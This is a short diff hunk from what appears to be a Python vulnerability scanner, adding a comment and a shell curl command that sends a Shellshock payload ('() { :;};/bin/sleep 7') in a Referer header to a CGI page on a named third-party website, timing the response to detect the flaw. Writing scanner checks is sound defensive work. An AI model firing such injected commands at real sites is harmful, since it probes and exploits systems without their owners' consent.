@@ -86,3 +86,6 @@ class DZBackupTester(Tester): # FIXME: change to Scanner, not Tester
 """
 
 
+# -I fetch headers only
+time curl -I -v -H 'Referer: () { :;};/bin/sleep 7' 'http://www.whitewaterwest.cn/cgi/page.cgi?aid=338&_id=1448&zine=show'
+
